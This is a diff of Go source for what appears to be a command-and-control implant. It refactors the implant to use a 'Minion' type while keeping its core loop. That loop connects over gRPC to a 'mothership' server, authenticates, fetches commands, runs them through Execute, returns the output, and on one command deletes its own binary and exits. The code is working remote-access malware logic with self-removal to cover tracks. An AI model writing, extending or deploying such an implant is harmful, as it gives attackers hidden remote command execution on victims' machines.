@@ -26,7 +26,7 @@ type ImplantClientWrapper struct{
   Conn *grpc.ClientConn
 }
 
-func InitializeImplantClient(address,msid string,secure bool) (*ImplantClientWrapper,error){
+func InitializeImplantClient(address,msid string,secure bool) (*ImplantClientWrapper,error) {
   var (
     opts []grpc.DialOption
     client grpcapi.ImplantClient
@@ -49,43 +49,37 @@ func InitializeImplantClient(address,msid string,secure bool) (*ImplantClientWra
   },nil
 }
 
-func (iw *ImplantClientWrapper) Close() error{
+func (iw *ImplantClientWrapper) Close() error {
   return iw.Conn.Close()
 }
 
 //var IsAlive bool
-type Implant struct{
-  Address string
-  MothershipID string
-  MotherShips []string
-  TunnelAddress string
-  ISession *c2.Session
-  OS string
-  Tls bool
-  RootPem []byte
+// we will use dfgn.Minion here
+type Implant struct {
+  Min *dfn.Minion
 }
 
 func (i *Implant) RunGRPCImplant(){
   var output string
   var IsAlive bool
   CreateClient:
-  iClient,err := InitializeImplantClient(i.Address,i.ISession.SessionID,false)
+  iClient,err := InitializeImplantClient(i.Min.Address,i.Min.MotherShipID,false)
   if err != nil{
     utils.Logerror(err)
   }
   //defer iClient.Close()
   var Register = func(){
     //send an indicator of msid to ensure heredity
-    fmt.Println("My ID is: ",i.ISession.SessionID)
+    fmt.Println("My ID is: ",i.Min.MinionID)
     ctx := context.Background()
     var auth = new(grpcapi.Auth)
-    auth.UserId = i.ISession.SessionID
-    auth.MSId = i.ISession.MotherShipID
+    auth.UserId = i.Min.MinionID
+    auth.MSId = i.Min.MotherShipID
     auth,err := iClient.IClient.RunAuthentication(ctx,auth)
     if err != nil { utils.Logerror(err); return }
     if !auth.Authenticated { IsAlive = false;utils.DangerPanic(fmt.Errorf("Find your own mother")) }
     IsAlive =  true
-    fmt.Println("Registered minion with ID......",i.ISession.SessionID)
+    fmt.Println("Registered minion with ID......",i.Min.MinionID)
   }
   //IsAlive = true
   if !IsAlive { time.Sleep(2 * time.Second); Register()}
@@ -95,7 +89,7 @@ func (i *Implant) RunGRPCImplant(){
   ctx := context.Background()
   for {
     var req = new(grpcapi.Command)
-    req.UserId = i.ISession.SessionID
+    req.UserId = i.Min.MinionID
     cmd,err := iClient.IClient.FetchCommand(ctx,req)
     if err != nil{
       utils.Warning(fmt.Sprintf("%s",err)); time.Sleep(5 * time.Second); goto CreateClient;
@@ -198,7 +192,7 @@ func (i *Implant) RunGRPCImplant(){
         _ = os.Remove(os.Args[0])
         os.Exit(0)
       default:
-        if cmd.UserId == i.ISession.SessionID && cmd.Individual {
+        if cmd.UserId == i.Min.MinionID && cmd.Individual {
           output = Execute(cmd.In)
           cmd.Out += output
           iClient.IClient.SendOutput(ctx,cmd)
